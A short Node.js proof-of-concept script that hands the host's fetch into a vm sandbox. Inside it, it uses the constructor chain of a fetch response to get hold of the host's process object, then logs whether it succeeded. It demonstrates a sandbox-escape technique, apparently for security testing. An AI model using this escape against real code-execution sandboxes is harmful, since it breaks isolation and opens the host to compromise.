const vm = require('vm');

const sandbox = { fetch };
vm.createContext(sandbox);

const code = `
(async () => {
    try {
        const res = await fetch('https://example.com');
        const process_ext = res.constructor.constructor('return process')();
        console.log('Got process from fetch:', !!process_ext);
    } catch (e) {
        console.log('fetch Failed:', e.message);
    }
})();
`;

vm.runInContext(code, sandbox);
